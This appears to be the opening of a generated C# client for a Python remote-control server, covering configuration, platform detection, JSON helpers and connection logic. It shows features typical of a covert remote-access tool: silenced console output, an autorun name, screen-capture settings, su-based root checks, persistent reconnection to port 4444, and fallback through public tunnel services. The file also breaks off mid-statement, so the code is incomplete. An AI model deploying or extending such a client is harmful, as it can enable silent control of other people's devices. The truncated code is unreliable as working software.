#:package SixLabors.ImageSharp@3.1.12
#:property PublishAot=false
#:property JsonSerializerIsReflectionEnabledByDefault=true

// client.cs - single-file C#/.NET client for controller.py.
//
// GENERATED FILE: edit the canonical sources in csharp/ and run
//     python3 csharp/assemble_client_cs.py
// to regenerate this file.  The wire protocol and behavior are identical to
// client.py v20; this file is a concatenation of the tested multi-file source.
//
// This is a .NET 10 file-based app.  Run it directly:
//     dotnet run --file client.cs -- tcp://127.0.0.1:4444
// The #:package directive above makes dotnet restore ImageSharp automatically.
// The two #:property lines disable the file-based app's AOT/trimming defaults,
// which otherwise disable the reflection-based System.Text.Json serialization
// this client uses.  For a normal project/executable build, use
// csharp/CmonClient.csproj instead.

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Buffers;
using System.Buffers.Text;
using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Collections.Concurrent;
using System.Security.Cryptography.X509Certificates;
using Microsoft.Win32.SafeHandles;
using System.Text.RegularExpressions;
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.Formats.Jpeg;
using SixLabors.ImageSharp.PixelFormats;
using SixLabors.ImageSharp.Processing;
using System.Security;
using Microsoft.Win32;
using System.Reflection;

namespace CmonClient
{
// ===== Core.cs =====
// Core.cs - constants, platform detection, JSON helpers and the socket-shaped
// connection abstraction shared by every transport. Translated from client.py
// (v20) without changing the wire protocol.



public static class Cfg
{
    public const string Auto = "auto";
    public const string Tcp = "tcp";
    public const string Http = "http";
    public const string Https = "https";

    public const string DefaultIp = "192.168.0.113";
    public const int DefaultPort = 4444;
    public const int RetryDelay = 1;                 // seconds between reconnect attempts
    public const int ReconnectDelayMs = 500;         // after an established link drops
    public const int FastRetryStartMs = 100;         // startup: retry quickly while the controller is still booting
    public const int FastRetryWindowMs = 4000;       // keep the fast cadence for this long
    public const int FastRetryMaxMs = 1000;          // then back off to at most this
    public const int ConnectTimeout = 3;             // seconds a LAN TCP connect may take
    public const int PublicConnectTimeout = 8;       // seconds for a public/tunnel TCP connect
    public const int RawHandshakeTimeout = 8;        // seconds for the CMON2 line/ack
    public const double HelloAckTimeout = 10.0;      // seconds for the application hello_ack
    public const int MaxMsg = 96 * 1024 * 1024;      // sanity bound for one protocol message
    public const int TransferChunk = 1024 * 1024;
    public const int MaxTransferChunk = 4 * 1024 * 1024;
    public const int TransferEntryBatch = 4096;
    public const int TransferEntryBytes = 4 * 1024 * 1024;
    public const long MaxCaptureBytes = 256L * 1024 * 1024;
    public const int HttpHandshakeTimeout = 10;
    public const int HttpSendStallTimeout = 30;
    public const int HttpMaxHeader = 32 * 1024;
    public const int HttpMaxLine = 4096;
    public const int HttpMaxChunk = MaxMsg;
    public static readonly byte[] CmonMagic = Encoding.ASCII.GetBytes("CMON2\n");
    public static readonly byte[] CmonAck = Encoding.ASCII.GetBytes("CMON2 OK\n");
    public const string CmonMarkerHeader = "X-CMon";
    public const string CmonMarkerValue = "1";
    public const string CmonVersion = "2";
    public const string CmonUserAgent = "cmon-client/2";
    public const string CmonWsProtocol = "cmon.v1";
    public const int CmonWsMaxFrame = 1024 * 1024;
    public const double CmonWsPing = 20.0;
    public const double CmonWsDead = 65.0;
    public const double CmonHttpPing = 20.0;
    public const double CmonHttpDead = 125.0;
    public const double TunnelProbeTimeout = 12.0;
    public const int HalfUpBatch = 1024 * 1024;
    public const int HalfUpTimeout = 120;
    public const int MaxOutput = 8 * 1024 * 1024;
    public static readonly (int W, int H) ScreenSize = (960, 540);
    public const int ScreenJpegQuality = 70;
    public const int ScreenshotJpegQuality = 85;
    public const int ScreenSendTimeout = 30;
    public const int SendTimeout = 2;
    public const int SendChunk = 512 * 1024;
    public const int SocketBuffer = 4 * 1024 * 1024;
    public const int RecvChunk = 1024 * 1024;
    public const int RecvStallTimeout = 300;
    public const int KeepAliveIdle = 20;
    public const int KeepAliveInterval = 5;
    public const int KeepAliveCount = 3;
    public const int CreateNoWindow = 0x08000000;

    public const int MaxDeferred = 32;
    public const long MaxDeferredBytes = 128L * 1024 * 1024;

    public static readonly string ConnectionType =
        (Environment.GetEnvironmentVariable("TUNNEL_TYPE") ?? Auto).Trim().ToLowerInvariant();

    public static readonly string[] ValidConnectionTypes = { Auto, Tcp, Http, Https };

    public static string ScriptPath =
        Environment.ProcessPath ?? Path.Combine(AppContext.BaseDirectory, "cmon-client");

    public static string AutorunName
    {
        get
        {
            var stem = Path.GetFileNameWithoutExtension(ScriptPath);
            var safe = System.Text.RegularExpressions.Regex.Replace(stem, "[^A-Za-z0-9_.-]+", "-");
            return string.IsNullOrEmpty(safe) ? "client" : safe;
        }
    }
}

public static class Platform
{
    private static readonly Dictionary<string, object?> Cache = new();
    private static readonly object CacheLock = new();

    public static bool IsWindows => RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
    public static bool IsLinux => RuntimeInformation.IsOSPlatform(OSPlatform.Linux);
    public static bool IsDarwin => RuntimeInformation.IsOSPlatform(OSPlatform.OSX);

    public static bool IsAndroid()
    {
        lock (CacheLock)
        {
            if (Cache.TryGetValue("android", out var cached)) return (bool)cached!;
            bool result;
            try
            {
                var prefix = Environment.GetEnvironmentVariable("PREFIX") ?? "";
                result = Type.GetType("Java.Lang.Object") != null
                         || Environment.GetEnvironmentVariable("ANDROID_ROOT") == "/system"
                         || prefix.StartsWith("/data/data/com.termux", StringComparison.Ordinal)
                         || (File.Exists("/system/build.prop") && File.Exists("/system/bin/sh"));
            }
            catch { result = false; }
            Cache["android"] = result;
            return result;
        }
    }

    public static bool IsIos()
    {
        lock (CacheLock)
        {
            if (Cache.TryGetValue("ios", out var cached)) return (bool)cached!;
            bool result = false;
            if (IsDarwin)
            {
                try
                {
                    var text = File.ReadAllText("/System/Library/CoreServices/SystemVersion.plist");
                    result = text.Contains("iPhone OS") || text.Contains("iPadOS");
                }
                catch { result = false; }
            }
            Cache["ios"] = result;
            return result;
        }
    }

    public static bool IsMacOs() => IsDarwin && !IsIos();

    public static bool GuiSessionAvailable()
    {
        if (!IsLinux || IsAndroid()) return true;
        return !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("DISPLAY"))
               || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("WAYLAND_DISPLAY"));
    }

    public static string Which(string name)
    {
        if (string.IsNullOrEmpty(name)) return "";
        if (Path.IsPathRooted(name))
            return File.Exists(name) ? name : "";
        var path = Environment.GetEnvironmentVariable("PATH") ?? "";
        foreach (var dir in path.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries))
        {
            try
            {
                var candidate = Path.Combine(dir, name);
                if (File.Exists(candidate)) return candidate;
            }
            catch { }
        }
        return "";
    }

    public static (string Id, string Name) DistroInfo()
    {
        if (IsAndroid()) return ("android", AndroidName());
        if (IsIos()) return ("ios", IosName());
        if (IsMacOs()) return ("macos", MacOsName());
        if (!IsLinux)
            return (OperatingSystem.IsWindows() ? "windows" : Environment.OSVersion.Platform.ToString().ToLowerInvariant(),
                    RuntimeInformation.OSDescription);
        try
        {
            var info = new Dictionary<string, string>();
            foreach (var line in File.ReadAllLines("/etc/os-release"))
            {
                if (!line.Contains('=')) continue;
                var idx = line.IndexOf('=');
                info[line[..idx]] = line[(idx + 1)..].Trim('"');
            }
            var id = (info.GetValueOrDefault("ID") ?? "linux").Trim('"').ToLowerInvariant();
            var name = info.GetValueOrDefault("PRETTY_NAME", info.GetValueOrDefault("NAME", "Linux"));
            return (id, name);
        }
        catch { return ("linux", "Linux"); }
    }

    public static int AndroidApi()
    {
        var env = (Environment.GetEnvironmentVariable("ANDROID__BUILD_VERSION_SDK") ?? "").Trim();
        if (int.TryParse(env, out var api)) return api;
        var props = AndroidProps();
        return int.TryParse(props.GetValueOrDefault("ro.build.version.sdk"), out var n) ? n : 0;
    }

    private static Dictionary<string, string>? _androidProps;
    private static readonly object AndroidPropsLock = new();

    private static Dictionary<string, string> AndroidProps()
    {
        lock (AndroidPropsLock)
        {
            if (_androidProps != null) return _androidProps;
            var props = new Dictionary<string, string>();
            try
            {
                var exe = Which("getprop");
                if (string.IsNullOrEmpty(exe)) exe = "/system/bin/getprop";
                var text = RunCapture(exe, Array.Empty<string>(), 5) ?? "";
                foreach (var line in text.Split('\n'))
                {
                    var m = System.Text.RegularExpressions.Regex.Match(line,
                        @"^\[([^\]]+)\]:\s*\[(.*)\]$");
                    if (m.Success) props[m.Groups[1].Value] = m.Groups[2].Value;
                }
            }
            catch { }
            _androidProps = props;
            return props;
        }
    }

    public static string AndroidName()
    {
        var props = AndroidProps();
        var version = props.GetValueOrDefault("ro.build.version.release");
        if (string.IsNullOrEmpty(version)) return "Android (version unknown)";
        var api = props.GetValueOrDefault("ro.build.version.sdk");
        var manufacturer = props.GetValueOrDefault("ro.product.manufacturer") ?? "";
        var model = props.GetValueOrDefault("ro.product.model") ?? "";
        var name = $"Android {version}";
        if (!string.IsNullOrEmpty(api)) name += $" (API {api})";
        var device = string.Join(' ', new[] { manufacturer, model }.Where(x => !string.IsNullOrEmpty(x))).Trim();
        if (!string.IsNullOrEmpty(device)) name += $" - {device}";
        return name;
    }

    public static string IosName()
    {
        try
        {
            var text = File.ReadAllText("/System/Library/CoreServices/SystemVersion.plist");
            var m = System.Text.RegularExpressions.Regex.Match(text,
                @"<key>ProductVersion</key>\s*<string>([^<]+)</string>");
            if (m.Success) return "iOS " + m.Groups[1].Value;
        }
        catch { }
        return "iOS";
    }

    public static string MacOsName()
    {
        var version = RunCapture("/usr/bin/sw_vers", new[] { "-productVersion" }, 5)?.Trim() ?? "";
        if (string.IsNullOrEmpty(version)) version = Environment.OSVersion.Version.ToString();
        var codename = version.Split('.')[0] switch
        {
            "26" => "Tahoe",
            "27" => "Golden Gate",
            _ => ""
        };
        return $"macOS {version}" + (string.IsNullOrEmpty(codename) ? "" : $" ({codename})");
    }

    public static string SuPath()
    {
        var found = Which("su");
        if (!string.IsNullOrEmpty(found)) return found;
        foreach (var path in new[] { "/system/bin/su", "/system/xbin/su", "/sbin/su", "/debug_ramdisk/su" })
            if (File.Exists(path)) return path;
        return "";
    }

    private static bool _androidRoot;
    private static DateTime _androidRootDeniedAt = DateTime.MinValue;

    public static bool AndroidRoot()
    {
        if (_androidRoot) return true;
        if (_androidRootDeniedAt != DateTime.MinValue
            && (DateTime.UtcNow - _androidRootDeniedAt).TotalSeconds < 45) return false;
        var su = SuPath();
        if (string.IsNullOrEmpty(su)) return false;
        var output = RunCapture(su, new[] { "-c", "id -u" }, 10);
        var ok = output != null && output.Trim() == "0";
        if (ok) _androidRoot = true;
        else _androidRootDeniedAt = DateTime.UtcNow;
        return ok;
    }

    public static string ShellExecutable()
    {
        if (IsAndroid()) return Which("sh") is { Length: > 0 } sh ? sh : "/system/bin/sh";
        return "";
    }

    public static string RunCapture(string exe, IEnumerable<string> args, int timeoutSeconds)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            foreach (var arg in args) psi.ArgumentList.Add(arg);
            using var p = Process.Start(psi);
            if (p == null) return null;
            // Drain stderr too; a helper that writes a diagnostic must never
            // fill its pipe and deadlock while we read stdout.
            var errorTask = p.StandardError.ReadToEndAsync();
            var text = p.StandardOutput.ReadToEnd();
            _ = errorTask;
            if (!p.WaitForExit(timeoutSeconds * 1000))
            {
                try { p.Kill(true); } catch { }
                return null;
            }
            return text;
        }
        catch { return null; }
    }

    public static string GetOsInfo()
    {
        if (IsAndroid()) return AndroidName();
        if (IsIos()) return IosName();
        if (IsMacOs()) return MacOsName();
        if (IsWindows) return $"Windows {Environment.OSVersion.Version}";
        if (IsLinux)
        {
            var (_, name) = DistroInfo();
            return $"Linux ({name})";
        }
        return RuntimeInformation.OSDescription;
    }
}

public static class Log
{
    // The Python client is deliberately silent. Console output is redirected to
    // TextWriter.Null in Program.Main; these helpers preserve that policy while
    // still allowing a debugger to break on the calls. Setting CMON_LOG to a
    // file path mirrors the messages to that file for diagnostics.
    private static readonly object Lock = new();
    private static StreamWriter? _file;

    private static StreamWriter? File()
    {
        if (_file != null) return _file;
        var path = (Environment.GetEnvironmentVariable("CMON_LOG") ?? "").Trim();
        if (path.Length == 0) return null;
        try
        {
            _file = new StreamWriter(new FileStream(path, FileMode.Append, FileAccess.Write,
                FileShare.ReadWrite)) { AutoFlush = true };
        }
        catch { _file = null; }
        return _file;
    }

    private static void Write(string text)
    {
        try { Console.Error.WriteLine(text); } catch { }
        var file = File();
        if (file == null) return;
        lock (Lock)
        {
            try
            {
                file.WriteLine($"{DateTime.Now:HH:mm:ss.fff} [{Environment.ProcessId}] {text}");
            }
            catch { }
        }
    }

    public static void Info(string text) => Write(text);
    public static void Error(string text) => Write(text);
}

public static class JsonUtil
{
    public static JsonNode? Get(JsonObject? obj, string key)
    {
        if (obj == null) return null;
        return obj.TryGetPropertyValue(key, out var value) ? value : null;
    }

    public static string? Str(JsonObject? obj, string key)
    {
        var value = Get(obj, key);
        if (value is JsonValue v)
        {
            if (v.TryGetValue<string>(out var s)) return s;
            if (v.TryGetValue<bool>(out var b)) return b ? "True" : "False";
            return v.ToJsonString();
        }
        return null;
    }

    public static long Long(JsonObject? obj, string key, long fallback = 0)
    {
        var value = Get(obj, key);
        if (value is JsonValue v)
        {
            if (v.TryGetValue<long>(out var l)) return l;
            if (v.TryGetValue<double>(out var d)) return (long)d;
            if (v.TryGetValue<string>(out var s) && long.TryParse(s, out var parsed)) return parsed;
        }
        return fallback;
    }

    public static double Double(JsonObject? obj, string key, double fallback = 0)
    {
        var value = Get(obj, key);
        if (value is JsonValue v)
        {
            if (v.TryGetValue<double>(out var d)) return d;
            if (v.TryGetValue<long>(out var l)) return l;
            if (v.TryGetValue<string>(out var s)
                && double.TryParse(s, NumberStyles.Float, CultureInfo.InvariantCulture, out var parsed)) return parsed;
        }
        return fallback;
    }

    public static bool Bool(JsonObject? obj, string key, bool fallback = false)
    {
        var value = Get(obj, key);
        if (value is JsonValue v)
        {
            if (v.TryGetValue<bool>(out var b)) return b;
            if (v.TryGetValue<long>(out var l)) return l != 0;
            if (v.TryGetValue<string>(out var s))
                return s is "1" or "true" or "yes" or "on";
        }
        return fallback;
    }

    public static bool IsValidReqId(JsonNode? id)
    {
        if (id is not JsonValue value) return false;
        return value.TryGetValue<string>(out _)
               || value.TryGetValue<bool>(out _)
               || value.TryGetValue<long>(out _)
               || value.TryGetValue<double>(out _);
    }

    public static string? ReqKey(JsonNode? id)
    {
        if (id is not JsonValue value) return null;
        if (value.TryGetValue<string>(out var s)) return "s:" + s;
        // Python uses the decoded scalar as a dict key, so True, 1 and 1.0
        // all collide.  Keep that behavior for transfer/cancel bookkeeping.
        if (value.TryGetValue<bool>(out var b)) return "n:" + (b ? "1" : "0");
        if (value.TryGetValue<long>(out var l)) return "n:" + l.ToString(CultureInfo.InvariantCulture);
        if (value.TryGetValue<double>(out var d))
        {
            if (double.IsFinite(d) && Math.Truncate(d) == d
                && d >= long.MinValue && d <= long.MaxValue)
                return "n:" + ((long)d).ToString(CultureInfo.InvariantCulture);
            return "f:" + d.ToString("R", CultureInfo.InvariantCulture);
        }
        return null;
    }

    public static JsonNode? Clone(JsonNode? node) => node?.DeepClone();

    public static JsonObject ParseObject(string json)
    {
        var node = JsonNode.Parse(json);
        return node as JsonObject ?? new JsonObject();
    }

    public static byte[] Serialize(JsonObject obj)
        => JsonSerializer.SerializeToUtf8Bytes(obj, JsonOpts);

    public static readonly JsonSerializerOptions JsonOpts = new()
    {
        Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping,
        WriteIndented = false
    };

    public static long MessageWeight(JsonNode? item)
    {
        long total = 0;
        var stack = new Stack<JsonNode?>();
        stack.Push(item);
        while (stack.Count > 0)
        {
            var value = stack.Pop();
            switch (value)
            {
                case null:
                    total += 1;
                    break;
                case JsonValue v:
                    if (v.TryGetValue<string>(out var s)) total += s.Length;
                    else total += 8;
                    break;
                case JsonObject obj:
                    foreach (var pair in obj)
                    {
                        total += pair.Key.Length;
                        stack.Push(pair.Value);
                    }
                    break;
                case JsonArray arr:
                    foreach (var child in arr) stack.Push(child);
                    break;
                default:
                    total += 8;
                    break;
            }
            if (total > Cfg.MaxDeferredBytes) return total;
        }
        return total;
    }
}

public static class NetUtil
{
    public static bool IsNumericHost(string host)
    {
        if (IPAddress.TryParse(host.Trim('[', ']'), out _)) return true;
        return false;
    }

    /// <summary>
    /// How long a TCP connect may take.  LAN links should fail fast; public
    /// tunnel edges (ngrok/Pinggy/Cloudflare) often need a little longer for
    /// the first SYN or DNS answer.
    /// </summary>
    public static int ConnectTimeoutForHost(string host)
        => HostIsPrivate(host) || LoopbackTarget(host) || IsNumericHost(host)
            ? Cfg.ConnectTimeout
            : Cfg.PublicConnectTimeout;

    public static Socket ConnectTarget(string host, int port)
    {
        var timeout = ConnectTimeoutForHost(host);
        if (IsNumericHost(host))
            return ConnectAddress(IPAddress.Parse(host.Trim('[', ']')), port, timeout);

        var task = Dns.GetHostAddressesAsync(host);
        if (!task.Wait(TimeSpan.FromSeconds(Math.Max(5, timeout))))
            throw new TimeoutException($"name resolution timed out for {host}");
        var addresses = task.Result;
        // Prefer IPv4 (the overwhelmingly common path for these tunnels and
        // LANs), then IPv6.  This avoids a dead IPv6 route adding seconds to
        // every reconnect on a dual-stack Windows machine.
        var ordered = addresses
            .Where(address => address.AddressFamily == AddressFamily.InterNetwork)
            .Concat(addresses.Where(address => address.AddressFamily == AddressFamily.InterNetworkV6))
            .Take(4)
            .ToArray();
        Exception? last = null;
        foreach (var address in ordered)
        {
            try { return ConnectAddress(address, port, timeout); }
            catch (Exception ex) { last = ex; }
        }
        throw last ?? new SocketException((int)SocketError.HostUnreachable);
    }

    private static Socket ConnectAddress(IPAddress address, int port, int timeoutSeconds)
    {
        var socket = new Socket(address.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        try
        {
            socket.SendTimeout = timeoutSeconds * 1000;
            socket.ReceiveTimeout = timeoutSeconds * 1000;
            var connect = socket.ConnectAsync(new IPEndPoint(address, port));
            if (!connect.Wait(TimeSpan.FromSeconds(timeoutSeconds)))
                throw new TimeoutException($"timed out connecting to {address}:{port}");
            return socket;
        }
        catch
        {
            try { socket.Dispose(); } catch { }
            throw;
        }
    }

    public static void TuneSocket(Socket sock)
    {
        try { sock.SendTimeout = Cfg.SendTimeout * 1000; } catch { }
        // ConnectAddress uses a bounded ReceiveTimeout for the connect/handshake
        // phase.  Leaving it there makes every idle control link look dead after
        // three seconds, so reset it to "block until data or EOF".
        try { sock.ReceiveTimeout = 0; } catch { }
        try { sock.NoDelay = true; } catch { }
        try { sock.SendBufferSize = Cfg.SocketBuffer; } catch { }
        try { sock.ReceiveBufferSize = Cfg.SocketBuffer; } catch { }
        try { sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true); } catch { return; }
        try { sock.SetSocketOption(SocketOptionLevel.Tcp, SocketOptionName.TcpKeepAliveTime, Cfg.KeepAliveIdle); } catch { }
        try { sock.SetSocketOption(SocketOptionLevel.Tcp, SocketOptionName.TcpKeepAliveInterval, Cfg.KeepAliveInterval); } catch { }
        try { sock.SetSocketOption(SocketOptionLevel.Tcp, SocketOptionName.TcpKeepAliveRetryCount, Cfg.KeepAliveCount); } catch { }
        if (Platform.IsWindows)
        {
            try
            {
                sock.IOControl(IOControlCode.KeepAliveValues,
                    BitConverter.GetBytes(1) .Concat(BitConverter.GetBytes(Cfg.KeepAliveIdle * 1000))
                        .Concat(BitConverter.GetBytes(Cfg.KeepAliveInterval * 1000)).ToArray(), null);
            }
            catch { }
        }
    }

    public static bool LooksLikeTunnelHost(string host)
    {
        var value = (host ?? "").Trim().ToLowerInvariant().TrimEnd('.');
        foreach (var suffix in new[]
                 {
                     "ngrok-free.app", "ngrok-free.dev", "ngrok.app", "ngrok.io", "ngrok.dev",
                     "pinggy.link", "pinggy-free.link", "pinggy.io", "pinggy.net", "pinggy.online",
                     "pinggy.top", "trycloudflare.com", "loca.lt", "serveo.net", "localhost.run",
                     "bore.pub", "tunnelmole.net", "telebit.cloud"
                 })
        {
            if (value == suffix || value.EndsWith("." + suffix, StringComparison.Ordinal)
                || value.EndsWith(suffix, StringComparison.Ordinal)) return true;
        }
        return false;
    }

    public static int DefaultPortForScheme(string scheme, string host = "")
    {
        scheme = (scheme ?? "").ToLowerInvariant();
        return scheme switch
        {
            "http" => 80,
            "https" => 443,
            "ws" => 80,
            "wss" => 443,
            "tls" => 443,
            "tcp" => Cfg.DefaultPort,
            _ => LooksLikeTunnelHost(host) ? 443 : Cfg.DefaultPort
        };
    }

    public static (string Host, int Port, string Scheme) ParseAddress(string? raw, int? explicitPort = null)
    {
        var text = (raw ?? "").Trim();
        if (string.IsNullOrEmpty(text)) text = Cfg.DefaultIp;
        var scheme = "";
        var host = "";
        int? port = null;
        if (text.Contains("://", StringComparison.Ordinal))
        {
            if (!Uri.TryCreate(text, UriKind.Absolute, out var uri))
                throw new ArgumentException($"invalid address {text}");
            scheme = uri.Scheme.ToLowerInvariant();
            if (scheme == "ws") scheme = "http";
            else if (scheme == "wss") scheme = "https";
            if (scheme is not ("tcp" or "tls" or "http" or "https" or "auto"))
                throw new ArgumentException($"unsupported address scheme '{scheme}'");
            host = uri.Host;
            if (!uri.IsDefaultPort) port = uri.Port;
        }
        else if (text.StartsWith("[", StringComparison.Ordinal))
        {
            var end = text.IndexOf(']');
            if (end < 0) throw new ArgumentException($"unclosed IPv6 address {raw}");
            host = text[1..end];
            var rest = text[(end + 1)..];
            if (rest.StartsWith(":", StringComparison.Ordinal) && int.TryParse(rest[1..], out var ip))
                port = ip;
        }
        else if (text.Count(c => c == ':') == 1)
        {
            var split = text.LastIndexOf(':');
            var possible = text[(split + 1)..];
            if (int.TryParse(possible, out var p))
            {
                host = text[..split];
                port = p;
            }
            else host = text;
        }
        else host = text;

        host = (host ?? "").Trim().Trim('[', ']');
        if (string.IsNullOrEmpty(host)) throw new ArgumentException($"address has no host: {raw}");
        var portWasExplicit = port != null || explicitPort != null;
        if (explicitPort != null) port = explicitPort;
        if (port == null)
        {
            var preference = Cfg.ConnectionType != Cfg.Auto ? Cfg.ConnectionType : "";
            port = DefaultPortForScheme(scheme.Length > 0 ? scheme : preference, host);
        }
        if (port <= 0 || port >= 65536) throw new ArgumentException($"port {port} is out of range");
        if (string.IsNullOrEmpty(scheme))
        {
            if (Cfg.ConnectionType != Cfg.Auto) scheme = Cfg.ConnectionType;
            // A bare tunnel hostname with no port is almost certainly the
            // HTTPS URL printed by ngrok/Pinggy/Cloudflare.  A tunnel hostname
            // WITH an explicit nonstandard port is often a raw TCP tunnel, so
            // leave that as "auto" and let the TCP candidate go first.
            else if ((!portWasExplicit && LooksLikeTunnelHost(host)) || port == 443)
                scheme = "https";
            else scheme = "auto";
        }
        return (host, port.Value, scheme);
    }

    public static bool LoopbackTarget(string address)
    {
        var value = (address ?? "").Trim().Trim('[', ']').ToLowerInvariant();
        return value is "localhost" or "::1" or "0.0.0.0" || value.StartsWith("127.", StringComparison.Ordinal);
    }

    public static string HostHeader(string host, int port)
    {
        var value = host;
        if (value.Contains(':') && !value.StartsWith("[", StringComparison.Ordinal)) value = $"[{value}]";
        return $"{value}:{port}";
    }

    public static bool HostIsPrivate(string host)
    {
        var value = (host ?? "").Trim().Trim('[', ']').ToLowerInvariant();
        if (value is "localhost" or "0.0.0.0" or "::1"
            || value.EndsWith(".local", StringComparison.Ordinal)
            || value.EndsWith(".lan", StringComparison.Ordinal)
            || value.EndsWith(".internal", StringComparison.Ordinal)) return true;
        if (!IPAddress.TryParse(value, out var address)) return false;
        if (IPAddress.IsLoopback(address)) return true;
        if (address.AddressFamily == AddressFamily.InterNetwork)
        {
            var b = address.GetAddressBytes();
            return b[0] == 10 || (b[0] == 172 && b[1] >= 16 && b[1] <= 31)
                   || (b[0] == 192 && b[1] == 168) || b[0] == 169 && b[1] == 254
                   || (b[0] == 100 && b[1] >= 64 && b[1] <= 127)
                   || (b[0] == 192 && b[1] == 0 && b[2] == 0)
                   || (b[0] == 198 && (b[1] == 18 || b[1] == 19))
                   || (b[0] == 198 && b[1] == 51 && b[2] == 100)
                   || (b[0] == 203 && b[1] == 0 && b[2] == 113)
                   || b[0] >= 224
                   || (b[0] == 0 && b[1] == 0 && b[2] == 0 && b[3] == 0);
        }
        var v6 = address.GetAddressBytes();
        return address.IsIPv6LinkLocal || address.IsIPv6SiteLocal
               || (v6.Length == 16 && (v6[0] & 0xfe) == 0xfc)
               || address.Equals(IPAddress.IPv6Any);
    }

    public static string ConnectErrorHint(Exception e)
    {
        if (e is SocketException se)
        {
            return se.SocketErrorCode switch
            {
                SocketError.HostNotFound or SocketError.NoData =>
                    "cannot resolve that address; check the IP or hostname",
                SocketError.TimedOut =>
                    "timed out - wrong address or port, a firewall drops the packets, or host -> guest over NAT without a port forward",
                SocketError.ConnectionRefused =>
                    "connection refused - nothing is listening there (controller not running, wrong port, or a firewall)",
                SocketError.ConnectionReset =>
                    "connection reset - something on that port is not the controller",
                SocketError.NetworkUnreachable or SocketError.HostUnreachable =>
                    "no route to that address - the machines are not on the same network",
                _ => se.Message
            };
        }
        if (e is TimeoutException) return "timed out - wrong address or port, or a firewall drops the packets";
        return e.Message;
    }

    public static Exception Unwrap(Exception ex)
    {
        while (ex is AggregateException aggregate && aggregate.InnerExceptions.Count > 0)
            ex = aggregate.InnerExceptions[0];
        return ex;
    }

    public static bool IsHostDown(Exception ex)
    {
        ex = Unwrap(ex);
        if (ex is SocketException socket)
            return socket.SocketErrorCode is SocketError.HostNotFound or SocketError.NoData;
        return ex is TimeoutException
               && ex.Message.Contains("name resolution", StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// True when the host:port itself is unreachable.  All transports on that
    /// port can be skipped: trying TCP, TLS, WebSocket and HTTP one after
    /// another against a refused or filtered port only multiplies the wait.
    /// </summary>
    public static bool IsPortDown(Exception ex)
    {
        ex = Unwrap(ex);
        if (ex is TimeoutException) return true;
        if (ex is SocketException socket)
        {
            return socket.SocketErrorCode is
                SocketError.ConnectionRefused or SocketError.HostUnreachable
                or SocketError.NetworkUnreachable or SocketError.TimedOut
                or SocketError.HostNotFound or SocketError.NoData
                or SocketError.AddressNotAvailable or SocketError.AddressFamilyNotSupported;
        }
        return false;
    }

    /// <summary>
    /// Accepted, then closed immediately (or reset).  A tunnel edge does this
    /// while the application behind it is still starting, and a server that
    /// does not speak the selected protocol does it too.
    /// </summary>
    public static bool IsSoftClose(Exception ex)
    {
        for (Exception? e = ex; e != null; e = e.InnerException)
        {
            if (e is EndOfStreamException) return true;
            if (e is SocketException socket)
            {
                if (socket.SocketErrorCode is SocketError.ConnectionReset
                    or SocketError.ConnectionAborted or SocketError.Shutdown)
                    return true;
            }
            var message = (e.Message ?? "").ToLowerInvariant();
            if (message.Contains("closed at once") || message.Contains("closed during")
                || message.Contains("ended early") || message.Contains("end of stream")
                || message.Contains("connection reset") || message.Contains("forcibly closed")
                || message.Contains("connection was closed") || message.Contains("0 bytes"))
                return true;
        }
        return false;
    }

    public static bool LooksLikeMeteredHost(string host)
    {
        var value = (host ?? "").Trim().ToLowerInvariant().TrimEnd('.');
        foreach (var suffix in new[]
                 {
                     "ngrok-free.app", "ngrok-free.dev", "ngrok.app", "ngrok.io", "ngrok.dev"
                 })
        {
            if (value == suffix || value.EndsWith("." + suffix, StringComparison.Ordinal)
                || value.EndsWith(suffix, StringComparison.Ordinal)) return true;
        }
        return false;
    }

    /// <summary>
    /// Startup retry cadence.  The first few seconds use a short cadence so a
    /// client started at the same time as the controller connects as soon as
    /// the controller's listener appears.  After that it backs off, and ngrok
    /// (which meters connections) gets a gentler cadence.
    /// </summary>
    public static TimeSpan RetryDelay(string host, int attempt, DateTime started)
    {
        if (attempt <= 0) return TimeSpan.Zero;
        var elapsed = DateTime.UtcNow - started;
        if (LooksLikeMeteredHost(host))
        {
            if (elapsed < TimeSpan.FromSeconds(10)) return TimeSpan.FromMilliseconds(250);
            if (elapsed < TimeSpan.FromMinutes(10)) return TimeSpan.FromSeconds(2);
            return TimeSpan.FromSeconds(30);
        }
        if (elapsed < TimeSpan.FromMilliseconds(Cfg.FastRetryWindowMs))
            return TimeSpan.FromMilliseconds(Cfg.FastRetryStartMs);
        var ms = Math.Min(Cfg.FastRetryMaxMs,
            Cfg.FastRetryStartMs * Math.Pow(1.6, Math.Min(attempt - 1, 10)));
        if (elapsed > TimeSpan.FromSeconds(30)) ms = Math.Min(3000, ms * 2);
        return TimeSpan.FromMilliseconds(ms);
    }
}

/// <summary>Bounded, blocking byte queue replacing the socketpair adapters.</summary>
public sealed class BlockingByteQueue
{
    private readonly LinkedList<byte[]> _queue = new();
    private readonly object _gate = new();
    private int _bytes;
    private readonly int _maxBytes;
    private bool _completed;

    public BlockingByteQueue(int maxBytes = Cfg.SocketBuffer) => _maxBytes = maxBytes;

    public bool IsCompleted { get { lock (_gate) return _completed; } }

    public bool WaitReadable(int timeoutMs)
    {
        lock (_gate)
        {
            if (_queue.Count > 0 || _completed) return true;
            if (timeoutMs < 0) Monitor.Wait(_gate);
            else Monitor.Wait(_gate, timeoutMs);
            return _queue.Count > 0 || _completed;
        }
    }

    public int Read(byte[] buffer, int offset, int count, int timeoutMs)
    {
        lock (_gate)
        {
            var deadline = timeoutMs < 0 ? long.MaxValue
